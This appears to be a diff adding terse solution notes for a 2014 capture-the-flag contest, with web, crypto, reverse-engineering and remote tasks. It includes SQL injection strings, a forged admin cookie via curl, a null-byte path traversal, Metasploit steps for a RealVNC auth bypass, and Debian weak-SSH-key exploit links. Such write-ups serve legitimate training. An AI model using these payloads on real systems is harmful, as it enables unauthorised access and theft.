@@ -1,0 +1,97 @@
+AFK:
+	Just.. crack it open. Lots' o help on google ;)
+
+
+
+
+Web 01: Just read the source and push in the password
+	http://151.216.233.85/web/c3ac101207ff0940c12df1277115a21b21b63a8f6f532abd12c3caec7075144f/
+
+Web 02: Go to parent dir, and look around from there
+	http://151.216.233.85/web/c3127f748fd33198f5f521dca3b69fa804310d87ce680b56aaa9de688ab17c07/task03.php
+
+Web 03: Set your useragent to one that Googlebot uses
+	http://151.216.233.85/web/5f15d1a82f6342b7715810a1ed004476c495d823215df8258469b5e17946621b/
+
+Web 04: "' or 1 -- "
+	http://151.216.233.85/web/e49c7772b993b86829a931216e7f2bb2a11c868495828e29d1984fe433a2785e/
+
+Web 05: curl -v to get cookies.. then curl -v -b "user=admin; path=/; a=1;" \ 
+	http://151.216.233.85/web/f2ca1bb6c7e907d06dafe4687e579fce76b37e4e93b7605022da52e6ccc26fd2/gettoken.php
+
+Web 06: change to ../password.txt%00, since 5.3.3 had this stupid null byte bug
+	http://151.216.233.85/web/1bdd10d158eb5ac1e3bf0760feb5ce7a77fc44fd0e0235ca6056c82c1b010e10/
+
+Web 07: The usual stuff didn't work.. hmm.. but \' throws error.
+	If we replace ' with \', the last query was \\' and we can see why the query failed
+	"\' or 1 -- "
+	http://151.216.233.85/web/58a71fe6043522fda2d098eeecabc41ec0f1949d3e96cae46ed024e974f36d66/
+
+
+
+
+Crypto 01: Basic caesar cipher. When you see LOREM IPSUM, you can search for the token
+	http://hack.tg14.gathering.org/assignments/534ee474f3138a054600002c
+
+Crypto 02: You have to come up with the idea that we could be looking at sha512
+		Cracking is simple
+	444dc1410ca797132e2cba8f3fe9e51d997b09ecd3e3f600af8a683d566c8348e80519dff90f2f70c99768c7c4ad6107584065ce5e92a7d07a9e90d87e49d733
+	Put it into a sha512 cracker, and: awzm
+
+Crypto 03:
+	After cracking rsa, you get the private key. Now, the length is 112 bytes, 2^4 * 7
+	So, let's assume 7 blocks of 16. We proceed to make an int of the 16 block
+	First block is 14681329815469611171265110655343317822
+	Decrypting it: 281441281418489127035953670741060713
+	When you mod 256 then divide, you'll read backwards, so remember inverting
+	105 108 32 97 32	... "64 bits is a li"
+	The next block will be crap, that's when CBC comes in.
+	We use our crypto text to xor with the next plaintext
+	ta-dah! this should be enough.
+	# scripts at cafeteria
+
+Rev 01: Just dump the .rodata section, or run strings ;)
+
+Rev 02: This code basically does what the crypto task does, rotate the strings.
+	Next easiest way is probably to open in debugger and break after every call to the function
+	Simplest? ltrace, but don't expect it next year
+
+Rev 03: This code xors together two strings to produce the token. They are in the .data section, and the code points to their addresses
+
+Rev 04: This code starts with xoring some other code and a key, then it calls it.
+	This other code, decrypts a string and its key, and then it deinterleaves it.
+	Next, the code will call strcmp and the other functions to ask you for the password
+	As usual, watching it with a debugger is a good solution, but ltrace is better (Can't promise that it will work next year though!)
+
+
+remote 01:
+	Box runs realvnc 4.1.1, vulnerable to null auth
+	10.75.1.7 kali
+		msfconsole
+		use auxiliary/admin/vnc/realvnc_41_bypass
+		set RHOST 10.75.10.3
+		run
+	back at host (or new terminal, if you are local)
+	vncviewer 127.0.0.1
+
+remote 02:
+	Box runs debian with insecure ssh keys, so you have to try all the bad keys against it
+	# Ask Alexi
+	# hawken@hercules:tg14/remote02
+	http://www.exploit-db.com/sploits/debian_ssh_rsa_2048_x86.tar.bz2
+	http://www.exploit-db.com/exploits/5720/
+	unpack and have fun against ifi@10.75.13.37
+
+remote 03:
+	You will get heart\tbleed every time you heartbleed-test the machine. The only challenge left is to insert the token. You could just copy&paste or use inspection tools to manually insert the tab into the field
+	hb-test.py @ 10.75.1.7
+
+remote 04:
+	This one is a little tricky. Using the longest common substring algorithm, you can find a portion of the private key to start with. You will then search across the messages to extend the amount of fragments you have of the private key.
+	You will eventually find the start and end. Then just put it together, and convert it into a key (base64 + headers)
+	Then convert the challenge to binary and store it
+	 
+	openssl rsautl -decrypt -inkey privkey.key  < ./challenge.bin  | xxd
+
+
+
